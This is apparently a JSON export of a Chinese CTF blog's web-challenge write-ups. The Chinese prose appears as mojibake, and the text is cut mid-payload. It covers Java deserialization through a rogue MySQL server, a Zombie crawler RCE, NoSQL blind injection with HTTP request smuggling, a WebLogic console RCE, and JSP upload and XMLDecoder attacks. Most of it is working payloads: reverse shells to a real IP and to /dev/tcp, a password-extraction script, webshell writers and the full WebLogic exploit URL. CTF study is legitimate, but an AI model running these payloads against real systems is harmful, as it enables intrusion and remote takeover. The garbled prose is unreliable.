1rO0ABXN9AAAAAgAUamF2YS5pby5TZXJpYWxpemFibGUAHmdkdWZzLmNoYWxsZW5nZS53ZWIubW9kZWwuSW5mb3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRnZHVmcy5jaGFsbGVuZ2Uud2ViLmludm9jYXRpb24uSW5mb0ludm9jYXRpb25IYW5kbGVyY59H&#x2F;KdZhO8CAAFMAARpbmZvdAAgTGdkdWZzL2NoYWxsZW5nZS93ZWIvbW9kZWwvSW5mbzt4cHNyACZnZHVmcy5jaGFsbGVuZ2Uud2ViLm1vZGVsLkRhdGFiYXNlSW5mb19JEpYnRJPdAgAFTAAKY29ubmVjdGlvbnQAFUxqYXZhL3NxbC9Db25uZWN0aW9uO0wABGhvc3R0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgAJTAAEcG9ydHEAfgAJTAAIdXNlcm5hbWVxAH4ACXhwcHQADTEyMS4zNy4xMC4yNTR0AGUxMjMmYXV0b0Rlc2VyaWFsaXplPXRydWUmcXVlcnlJbnRlcmNlcHRvcnM9Y29tLm15c3FsLmNqLmpkYmMuaW50ZXJjZXB0b3JzLlNlcnZlclN0YXR1c0RpZmZJbnRlcmNlcHRvcnQABDMzMDZ0AJl5c29fQ29tbW9uc0NvbGxlY3Rpb25zNV9iYXNoJTIwLWMlMjAlN0JlY2hvJTJDWW1GemFDQXRhU0ElMkJKaUF2WkdWMkwzUmpjQzh4TWpFdU16Y3VNVEF1TWpVMEx6RXdNREFnTUQ0bU1RJTNEJTNEJTdEJTdDJTdCYmFzZTY0JTJDLWQlN0QlN0MlN0JiYXNoJTJDLWklN0Q&#x3D; ä½œä¸ºcookieä¸­çš„dataå€¼ æ‰§è¡Œï¼ŒmysqlæœåŠ¡ç«¯æ”¶åˆ°è¿æ¥ï¼Œå‘é€ç›¸åº”payload æˆåŠŸåå¼¹shell","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"java web","slug":"CTF/java-web","permalink":"https://123-prog.github.io/categories/CTF/java-web/"}],"tags":[{"name":"mysqlæ¶æ„æœåŠ¡ç«¯è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶","slug":"mysqlæ¶æ„æœåŠ¡ç«¯è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶","permalink":"https://123-prog.github.io/tags/mysql%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"},{"name":"javaååºåˆ—åŒ–","slug":"javaååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"javaåŠ¨æ€ä»£ç†çŸ¥è¯†","slug":"javaåŠ¨æ€ä»£ç†çŸ¥è¯†","permalink":"https://123-prog.github.io/tags/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9F%A5%E8%AF%86/"}]},{"title":"(2021ç¥¥äº‘æ¯)cralwer_z","slug":"2021ç¥¥äº‘æ¯-cralwer-z","date":"2021-09-01T14:24:37.000Z","updated":"2021-09-22T10:20:30.681Z","comments":true,"path":"2021/09/01/2021ç¥¥äº‘æ¯-cralwer-z/","link":"","permalink":"https://123-prog.github.io/2021/09/01/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z/","excerpt":"0x01ç»™äº†æºç ï¼Œæ­£å¸¸æ³¨å†Œï¼Œç™»å½•åè¿›å…¥è·¯ç”±/user /profileç”¨äºå±•ç¤ºå’Œæ›´æ”¹Userä¿¡æ¯ï¼Œå¯ä»¥æ›´æ”¹User.bucketï¼Œä½†è¿™é‡Œæ˜¯åˆæ­¥æ›´æ”¹","text":"0x01ç»™äº†æºç ï¼Œæ­£å¸¸æ³¨å†Œï¼Œç™»å½•åè¿›å…¥è·¯ç”±/user /profileç”¨äºå±•ç¤ºå’Œæ›´æ”¹Userä¿¡æ¯ï¼Œå¯ä»¥æ›´æ”¹User.bucketï¼Œä½†è¿™é‡Œæ˜¯åˆæ­¥æ›´æ”¹ 1234567await User.update(&#123; affiliation, age, personalBucket: bucket &#125;, &#123; where: &#123; userId: req.session.userId &#125; &#125;); è¿™é‡Œå¹¶æ²¡æœ‰ç›´æ¥æ›´æ”¹Userçš„bucketä¿¡æ¯ï¼Œè€Œæ˜¯å…ˆå­˜æ”¾åœ¨personalBucketä¸­ï¼Œåé¢æ›´æ”¹çš„æ—¶å€™è¿˜è¦éªŒè¯ä¸€ä¸‹token è¿™é‡Œæ­£å¸¸æ›´æ”¹çš„è¯ä¼šæœ‰è¿‡æ»¤ï¼Œå¿…é¡»ç¬¦åˆæ­£åˆ™åŒ¹é… /^https:\\/\\/[a-f0-9]&#123;32&#125;\\.oss-cn-beijing\\.ichunqiu\\.com\\/$/ ä½†å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼ï¼Œå…ˆæ›´æ”¹personalBucketï¼Œè¿™æ—¶å€™è‚¯å®šæ˜¯ä¸ç¬¦åˆæ­£åˆ™çš„ï¼Œç¨‹åºå°±ä¸ä¼šè¿›è¡Œè·³è½¬æ›´æ”¹ï¼Œä½†æˆ‘ä»¬å¯ä»¥è‡ªå·±æ‹¿tokenåœ¨verifyè·¯ç”±ä¸‹æ›´æ”¹ï¼Œä¸»è¦æ˜¯tokenè¦ç¬¦åˆè¦æ±‚ /verifyå¯ä»¥è¯´æ‰æ˜¯çœŸæ­£æ›´æ”¹bucketçš„åœ°æ–¹ï¼Œçœ‹ä¸€ä¸‹ä»£ç  123456789101112131415161718192021222324252627282930313233router.get(&#x27;/verify&#x27;, async (req, res, next) =&gt; &#123; let &#123; token &#125; = req.query; if (!token || typeof (token) !== &quot;string&quot;) &#123; return res.send(&quot;Parameters error&quot;); &#125; let user = await User.findByPk(req.session.userId); const result = await Token.findOne(&#123; token, userId: req.session.userId, valid: true &#125;); if (result) &#123; try &#123; await Token.update(&#123; valid: false &#125;, &#123; where: &#123; userId: req.session.userId &#125; &#125;); await User.update(&#123; bucket: user.personalBucket &#125;, &#123; where: &#123; userId: req.session.userId &#125; &#125;); user = await User.findByPk(req.session.userId); return res.render(&#x27;user&#x27;, &#123; user, message: &quot;Successfully update your bucket from personal bucket!&quot; &#125;); &#125; catch (err) &#123; next(createError(500)); &#125; &#125; else &#123; user = await User.findByPk(req.session.userId); return res.render(&#x27;user&#x27;, &#123; user, message: &quot;Failed to update, check your token carefully&quot; &#125;) &#125;&#125;) ä¸Šé¢éªŒè¯tokenåº”è¯¥æ˜¯å‡ºç°äº†éé¢„æœŸ 12345const result &#x3D; await Token.findOne(&#123; token, userId: req.session.userId, valid: true &#125;); tokenåº”è¯¥ä¸ºtoken:token å¯¼è‡´åªè¦tokenå­˜åœ¨å°±å¯ä»¥ï¼Œvalidå°±æ— å…³ç´§è¦äº† æ‰€ä»¥ç°åœ¨å¯ä»¥ä¸å—é™åˆ¶æ›´æ”¹bucketï¼Œæ­¥éª¤æ˜¯ï¼Œå…ˆæäº¤ç¬¦åˆè¦æ±‚çš„bucketæ‹¿åˆ°æœ‰æ•ˆtokenï¼Œç„¶åæäº¤ä¸ç¬¦åˆè¦æ±‚çš„bucketï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡bucketï¼Œè¿™æ ·Userä¸­çš„personalBucketå°±æ˜¯ç›®æ ‡bucketï¼Œç„¶åè®¿é—®/user/verify?token=xxxï¼Œå°±å¯ä»¥æ›´æ”¹bucketäº† 0x02åˆ©ç”¨zombieè¿›è¡ŒRCE è·¯ç”±/user/bucket 123456789101112131415161718192021222324router.get(&#39;&#x2F;bucket&#39;, async (req, res) &#x3D;&gt; &#123; const user &#x3D; await User.findByPk(req.session.userId); if (&#x2F;^https:\\&#x2F;\\&#x2F;[a-f0-9]&#123;32&#125;\\.oss-cn-beijing\\.ichunqiu\\.com\\&#x2F;$&#x2F;.exec(user.bucket)) &#123; return res.json(&#123; message: &quot;Sorry but our remote oss server is under maintenance&quot; &#125;); &#125; else &#123; &#x2F;&#x2F; Should be a private site for Admin try &#123; const page &#x3D; new Crawler(&#123; userAgent: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.212 Safari&#x2F;537.36&#39;, referrer: &#39;https:&#x2F;&#x2F;www.ichunqiu.com&#x2F;&#39;, waitDuration: &#39;3s&#39; &#125;); await page.goto(user.bucket); const html &#x3D; page.htmlContent; const headers &#x3D; page.headers; const cookies &#x3D; page.cookies; await page.close(); return res.json(&#123; html, headers, cookies&#125;); &#125; catch (err) &#123; return res.json(&#123; err: &#39;Error visiting your bucket. &#39; &#125;) &#125; &#125;&#125;); Crawlerçˆ¬è™«ä½¿ç”¨Zombieå®ç°ï¼Œè€Œè¿™ä¸ªæ¨¡å—æ˜¯æœ‰æ¼æ´çš„ï¼Œå‚è€ƒ https://ha.cker.in/index.php/Article/13563 æ›´æ”¹bucketè¿˜è¦ç»•è¿‡ä¸€ä¸ªç®€å•çš„è¿‡æ»¤ 12345678910static checkBucket(url) &#123; try &#123; url &#x3D; new URL(url); &#125; catch (err) &#123; return false; &#125; if (url.protocol !&#x3D; &quot;http:&quot; &amp;&amp; url.protocol !&#x3D; &quot;https:&quot;) return false; if (url.href.includes(&#39;oss-cn-beijing.ichunqiu.com&#39;) &#x3D;&#x3D;&#x3D; false) return false; return true; &#125; ç”¨#ç»•è¿‡å°±å¯ä»¥äº† æäº¤bucketä¸ºhttp://vps ip:port/hack.html#oss-cn-beijing.ichunqiu.com åœ¨vpsä¸Šå¼€ä¸€ä¸ªhttpæœåŠ¡ï¼Œæ”¾ç½®hack.html å†…å®¹ä¸º 1&lt;script&gt;c&#x3D;&#39;constructor&#39;;this[c][c](&quot;c&#x3D;&#39;constructor&#39;;require&#x3D;this[c][c](&#39;return process&#39;)().mainModule.require;var sync&#x3D;require(&#39;child_process&#39;).spawnSync; var ls &#x3D; sync(&#39;bash&#39;, [&#39;-c&#39;,&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;x 0&gt;&amp;1&#39;],);console.log(ls.output.toString());&quot;)()&lt;&#x2F;script&gt; å†æ¬¡è®¿é—®/user/bucketå³å¯æ‹¿åˆ°shell","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"Nodejs","slug":"CTF/Nodejs","permalink":"https://123-prog.github.io/categories/CTF/Nodejs/"}],"tags":[{"name":"jsä»£ç å®¡è®¡","slug":"jsä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"zombie RCE","slug":"zombie-RCE","permalink":"https://123-prog.github.io/tags/zombie-RCE/"}]},{"title":"(GKCTF 2021)hackme","slug":"GKCTF-2021-hackme","date":"2021-08-18T15:02:19.000Z","updated":"2021-09-22T10:19:08.544Z","comments":true,"path":"2021/08/18/GKCTF-2021-hackme/","link":"","permalink":"https://123-prog.github.io/2021/08/18/GKCTF-2021-hackme/","excerpt":"0x01 nosqlæ³¨å…¥å‰å°æç¤ºnosql åˆ©ç”¨é‡è¨€å¼æ³¨å…¥ï¼Œå‘ç°å­˜åœ¨è¿‡æ»¤","text":"0x01 nosqlæ³¨å…¥å‰å°æç¤ºnosql åˆ©ç”¨é‡è¨€å¼æ³¨å…¥ï¼Œå‘ç°å­˜åœ¨è¿‡æ»¤ ç”±äºæ˜¯jsonæ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨Unicodeç¼–ç ç»•è¿‡ çœ‹æ¥å¿…é¡»æ‹¿åˆ°adminçš„å¯†ç äº†ï¼Œåˆ©ç”¨æ­£åˆ™åŒ¹é…è¿›è¡Œç›²æ³¨ï¼Œé¦–å…ˆåŒ¹é…åˆ°å¯†ç é•¿åº¦ä¸º32 1&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;.&#123;33&#125;&quot;&#125;&#125; æ³¨å…¥æ‹¿åˆ°å¯†ç ï¼Œå‚è€ƒè„šæœ¬ 1234567891011121314151617181920212223#coding=utf-8import requestsimport stringalp = string.printableno = &#x27;.+*?|&amp;$#^&#x27;url = &#x27;http://node4.buuoj.cn:29004/login.php&#x27;pw = &#x27;&#x27;addHeaders = &#123; &quot;Content-Type&quot;:&quot;application/json&quot;&#125;for i in range(32): for x in alp: if x not in no: data = &#x27;&#x27;&#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&#x27;&#x27;&#x27; %(pw+x) r = requests.post(url,headers=addHeaders,data=data) #print(r.text) if &quot;ç™»å½•äº†ï¼Œä½†æ²¡å®Œå…¨ç™»å½•&quot; in r.text: pw += x print(pw) break æ‹¿åˆ°å¯†ç ä¸º 142276606202db06ad1f29ab6b4a1307f ç™»å½•æˆåŠŸè·³è½¬åˆ°/admin 0x02ç™»å½•å®Œå‘ç°æœ‰ä¸ªè²Œä¼¼å¯ä»¥è¯»å–æ–‡ä»¶çš„æ¥å£ï¼Œä½†è¯»å–phpæ–‡ä»¶æ²¡æœ‰æ˜¾ç¤ºæºç ï¼ŒçŒœæµ‹æ˜¯php [filename]ï¼Œè¯»å–/proc/self/cmdlineå¯ä»¥è¯æ˜è¿™ä¸€ç‚¹ è¯»å–/flagä¼šå¾—åˆ°flagåœ¨å†…ç½‘ï¼Œé‚£ä¹ˆéœ€è¦æ‰¾åˆ°å†…ç½‘æœåŠ¡è¿›è¡Œæ”»å‡» è¯»å–ç¯å¢ƒå˜é‡/proc/self/environ 1USER&#x3D;nginxPWD&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;htmlSHLVL&#x3D;1HOME&#x3D;&#x2F;home&#x2F;nginx_&#x3D;&#x2F;usr&#x2F;bin&#x2F;php å¾—åˆ°å·¥ä½œç›®å½•/usr/local/nginx/html è€Œnginxé…ç½®æ–‡ä»¶åœ¨/usr/local/nginx/conf/nginx.confï¼Œ è¯»å–é…ç½®æ–‡ä»¶å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; server &#123; listen 80; error_page 404 404.php; root &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html; index index.htm index.html index.php; location ~ \\.php$ &#123; root &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; &#125;resolver 127.0.0.11 valid&#x3D;0s ipv6&#x3D;off;resolver_timeout 10s; # weblogic server &#123; listen 80; server_name weblogic; location &#x2F; &#123; proxy_set_header Host $host; set $backend weblogic; proxy_pass http:&#x2F;&#x2F;$backend:7001; &#125; &#125;&#125; çœ‹åˆ°nginxåä»£ï¼Œæ˜¯ä¸ªweblogic ç«¯å£ç›¸åŒï¼Œnginxæ ¹æ®è¯·æ±‚ä¸­çš„Hostå¤´éƒ¨åŒ¹é…å¯¹åº”serverï¼Œå¦‚æœåŒ¹é…ä¸åˆ°ï¼Œé»˜è®¤ç¬¬ä¸€ä¸ªserverï¼Œè¿™é‡ŒweblogicæœåŠ¡æ²¡æœ‰wafæ‰ï¼Œæ”¹Hostå¤´å°±å¯ä»¥è®¿é—®åˆ° è¿™é‡Œè¿˜æœ‰ä¸ªæ¼æ´ï¼Œæ³¨æ„åˆ°nginxçš„ç‰ˆæœ¬ä¸º1.17.6ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„error_pageå¯ä»¥èµ°ç§ï¼Œä¹Ÿå¯ä»¥è®¿é—®åˆ°weblogicï¼Œæœç´¢å¼•æ“æœä¸€ä¸‹èµ°ç§æ–¹æ³•ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨å‰åç«¯æœåŠ¡å™¨å¯¹GETè¯·æ±‚CL!=0æƒ…å†µå¤„ç†çš„ä¸ä¸€è‡´ï¼Œå‰ç«¯æœåŠ¡å™¨æ¥å—CL!=0ï¼Œåç«¯æœåŠ¡å™¨æ— è§†äº† è®¿é—®/aè§¦å‘error_pageï¼Œå¯ä»¥çœ‹åˆ°åœ¨è¯·æ±‚ä½“ä¸­çš„å†…å®¹è¢«å½“æˆå¦ä¸€ä¸ªè¯·æ±‚äº†ï¼Œè€Œä¸”å³ä½¿weblogicè¢«å‰ç«¯æœåŠ¡å™¨wafæ‰ä¹Ÿå¯ä»¥åˆ©ç”¨ 12345678GET &#x2F;a HTTP&#x2F;1.1Host: node4.buuoj.cn:25766Content-Length: 61GET &#x2F;console&#x2F;login&#x2F;LoginForm.jsp HTTP&#x2F;1.1Host: weblogic æ‹¿åˆ°weblogicç‰ˆæœ¬ 1WebLogic Server Version: 12.2.1.4.0 åˆ©ç”¨æœ‰å›æ˜¾çš„exp 1&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsolejndi.portal?test_handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20&#x3D;%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20&#x3D;%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20&#x3D;%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20&#x3D;%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20&#x3D;%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20&#x3D;%20req.getHeader(%22cmd%22);String[]%20cmds%20&#x3D;%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22&#x2F;c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22&#x2F;bin&#x2F;sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!&#x3D;%20null%20)&#123;%20String%20result%20&#x3D;%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20&#x3D;%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt(); ç„¶ååœ¨è¯·æ±‚å¤´éƒ¨æ·»åŠ cmd: xxxå³å¯å®ç°å‘½ä»¤æ‰§è¡Œï¼Œè€Œä¸”æœ‰å›æ˜¾ï¼Œæ‰§è¡Œ/readflagè¯»å–æ‹¿åˆ°flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"nosql","slug":"CTF/nosql","permalink":"https://123-prog.github.io/categories/CTF/nosql/"}],"tags":[{"name":"nosqlæ³¨å…¥","slug":"nosqlæ³¨å…¥","permalink":"https://123-prog.github.io/tags/nosql%E6%B3%A8%E5%85%A5/"}]},{"title":"GKCTFxDASCTF webéƒ¨åˆ†å¤ç°","slug":"GKCTFxDASCTF-webéƒ¨åˆ†å¤ç°","date":"2021-08-09T09:24:33.000Z","updated":"2021-09-22T10:19:23.557Z","comments":true,"path":"2021/08/09/GKCTFxDASCTF-webéƒ¨åˆ†å¤ç°/","link":"","permalink":"https://123-prog.github.io/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/","excerpt":"0x01 babycatè¿™é¢˜å‡ºäº†éé¢„æœŸï¼Œéé¢„æœŸå°±ç›´æ¥ä¼ é©¬ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤","text":"0x01 babycatè¿™é¢˜å‡ºäº†éé¢„æœŸï¼Œéé¢„æœŸå°±ç›´æ¥ä¼ é©¬ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ æ³¨å†Œä¸ªè´¦å·ï¼Œæç¤ºNot Allowedï¼Œè¿™é‡Œå­˜åœ¨é€»è¾‘æ¼æ´ï¼Œå³é”®æºç çœ‹åˆ°ç›´æ¥postæ•°æ®å¯ä»¥æ³¨å†Œ ç™»å½•åå¯ä»¥åœ¨/home/downloadå¤„ä¸‹è½½ä»»æ„ä»£ç ï¼Œè¯»å–web.xmlï¼Œå¾—çŸ¥åŒ…çš„ç»“æ„ï¼Œå¯ä»¥ä¸‹è½½classæ–‡ä»¶ï¼Œåç¼–è¯‘å°±å¯ä»¥å¾—åˆ°æºç  ä¾‹å¦‚/home/download?file=../classes/com/web/servlet/uploadServlet.class uploadè·¯ç”±çš„postæ–¹æ³• 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; if (!ServletFileUpload.isMultipartContent(req)) &#123; req.setAttribute(&quot;error&quot;, &quot;&lt;script&gt;alert(&#x27;something wrong&#x27;);history.back(-1)&lt;/script&gt;&quot;); req.getRequestDispatcher(&quot;../WEB-INF/error.jsp&quot;).forward(req, resp); &#125; DiskFileItemFactory factory = new DiskFileItemFactory(); factory.setSizeThreshold(3145728); factory.setRepository(new File(System.getProperty(&quot;java.io.tmpdir&quot;))); ServletFileUpload upload = new ServletFileUpload(factory); upload.setFileSizeMax(41943040L); upload.setSizeMax(52428800L); String uploadPath = System.getenv(&quot;CATALINA_HOME&quot;) + &quot;/webapps/ROOT/WEB-INF/upload/&quot;; try &#123; List&lt;FileItem&gt; formItems = upload.parseRequest(req); if (formItems != null &amp;&amp; formItems.size() &gt; 0) &#123; Iterator var7 = formItems.iterator(); label34: while(true) &#123; FileItem item; do &#123; if (!var7.hasNext()) &#123; break label34; &#125; item = (FileItem)var7.next(); &#125; while(item.isFormField()); String fileName = item.getName(); String ext = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)).replace(&quot;.&quot;, &quot;&quot;); String name = fileName.replace(ext, &quot;&quot;); if (checkExt(ext) || checkContent(item.getInputStream())) &#123; req.setAttribute(&quot;error&quot;, &quot;upload failed&quot;); req.getRequestDispatcher(&quot;../WEB-INF/upload.jsp&quot;).forward(req, resp); &#125; String filePath = uploadPath + File.separator + name + ext; File storeFile = new File(filePath); item.write(storeFile); req.setAttribute(&quot;error&quot;, &quot;upload success!&quot;); &#125; &#125; &#125; catch (Exception var14) &#123; req.setAttribute(&quot;error&quot;, &quot;&lt;script&gt;alert(&#x27;something wrong&#x27;);history.back(-1)&lt;/script&gt;&quot;); &#125; req.getRequestDispatcher(&quot;../WEB-INF/upload.jsp&quot;).forward(req, resp); &#125; å¹¶æ²¡æœ‰å¯¹èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œè¿‡æ»¤æ–‡ä»¶å†…å®¹å’Œåç¼€çš„åˆ¤æ–­åæ²¡æœ‰returnï¼Œåé¢çš„ä»£ç ç…§æ ·æ‰§è¡Œï¼Œè¿‡æ»¤äº†ä¸ªå¯‚å¯ ä¸Šä¼ é©¬ 12345678910111213141516171819202122import requestsimport jsons = requests.session()f = open(&#x27;shell.jsp&#x27;,&#x27;r&#x27;)data = f.read()#print(data)loginData = &#123; &quot;username&quot;:&quot;123&quot;, &quot;password&quot;:&quot;123&quot;&#125;loginUrl = &#x27;http://05d055c0-bfda-4c70-bd28-a331d01d153a.node4.buuoj.cn:81/login&#x27;url = &#x27;http://05d055c0-bfda-4c70-bd28-a331d01d153a.node4.buuoj.cn:81/home/upload&#x27;r = s.post(loginUrl,data=&#123;&quot;data&quot;:json.dumps(loginData)&#125;)r1 = s.post(url,files=&#123;&quot;file&quot;:(&quot;../../static/shell.jsp&quot;,data)&#125;) å¾€staticç›®å½•å†™é©¬ï¼Œæ‹¿flag é¢„æœŸè§£ï¼š é¦–å…ˆè¦æˆä¸ºadminï¼Œæ‰èƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œåœ¨æ³¨å†Œç±»ä¸­å¯ä»¥å‘ç°ï¼Œæ³¨å†Œæ—¶ä¼šåŒ¹é…è¿™æ ·çš„æ­£åˆ™ 1&quot;role&quot;:&quot;(.*?)&quot; å¹¶ä¼šå°†æœ€åçš„åŒ¹é…æ›¿æ¢æˆ&quot;role&quot;:&quot;guest&quot;ï¼Œç»•è¿‡payloadï¼Œä½¿ç”¨æ³¨é‡Š 1data&#x3D;&#123;&quot;username&quot;:&quot;xxx&quot;,&quot;password&quot;:&quot;xxx&quot;,&quot;role&quot;:&quot;admin&quot;&#x2F;*,&quot;role&quot;:&quot;xxx&quot;*&#x2F;&#125; ä¸Šä¼ æ–‡ä»¶æœ‰è¿‡æ»¤åç¼€å’Œå†…å®¹ï¼Œå…è®¸ä¸Šä¼ xmlæ–‡ä»¶ ç»“åˆåœ¨æ“ä½œæ•°æ®åº“çš„com.web.dao.baseDaoä¸­ 1Object obj = (new XMLDecoder(new FileInputStream(System.getenv(&quot;CATALINA_HOME&quot;) + &quot;/webapps/ROOT/WEB-INF/db/db.xml&quot;))).readObject(); ç›´æ¥è¯»å–db.xmlå¹¶ä¼ å…¥XMLDecoderè¿›è¡Œè§£æï¼Œè¿™é‡Œå¯ä»¥å¾€db.xmlå†™æ¶æ„xml è¿‡æ»¤äº†xmlæ–‡ä»¶å†…å®¹ 1String[] blackList = new String[]&#123;&quot;Runtime&quot;, &quot;exec&quot;, &quot;ProcessBuilder&quot;, &quot;jdbc&quot;, &quot;autoCommit&quot;&#125;; æ ¹æ®æç¤ºï¼Œä½¿ç”¨PrintWriterå†™shellï¼Œéœ€è¦ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥è¯»ç¯å¢ƒå˜é‡è·å– Runtimeåœ¨é»‘åå•é‡Œé¢ï¼Œå¯ä»¥å…ˆç”¨ä»»æ„å†™æ–‡ä»¶çš„é©¬ï¼Œå°†jspå†…å®¹å†™è¿›æŒ‡å®šæ–‡ä»¶ï¼Œè§¦å‘ä¸€æ¬¡XMLDecoderå°±å¯ä»¥ï¼Œç™»å½•æˆ–æ³¨å†Œéƒ½å¯ä»¥è§¦å‘ &lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt; 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;java version&#x3D;&quot;1.8.0_192&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;static&#x2F;shell.jsp&lt;&#x2F;string&gt;&lt;voidmethod&#x3D;&quot;println&quot;&gt;&lt;string&gt;&lt;![CDATA[&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt;]]&gt;&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;&lt;&#x2F;object&gt;&lt;&#x2F;java&gt; &lt;![CDATA[è¿™é‡Œçš„å†…å®¹ä¸ä¼šè¢«xmlè§£æå™¨è§£æï¼Œå¯ä»¥é¿å…ä¸€äº›éº»çƒ¦]]&gt; å®ç°ä»»æ„å†™æ–‡ä»¶ï¼Œå†å†™å‘½ä»¤æ‰§è¡Œé©¬ 1&#x2F;static&#x2F;shell.jsp?f&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;static&#x2F;c4t.jsp&amp;c&#x3D;&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt; 1&#x2F;static&#x2F;c4t.jsp?i&#x3D;bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D åå¼¹shellçš„å‘½ä»¤å¯ä»¥åœ¨http://www.jackson-t.ca/runtime-exec-payloads.htmlè¿™ä¸ªå·¥å…·ç¼–ç ä¸€ä¸‹ï¼Œ`Runtime.getRuntime().exec()`æœ‰äº›shellçš„ç‰¹æ®Šç¬¦å·å®ƒä¸è§£é‡Š æˆ–è€…ä¸ç”¨PrintWriterï¼Œç”¨xmlå®ä½“ç¼–ç å°±å¯ä»¥ç»•è¿‡å¯¹ProcessBuilderçš„è¿‡æ»¤ï¼Œæ‰€ä»¥æ¶æ„çš„xmlä¹Ÿå¯ä»¥æ˜¯ 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java&gt;&lt;object class=&quot;java.lang.&amp;#80;rocessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void 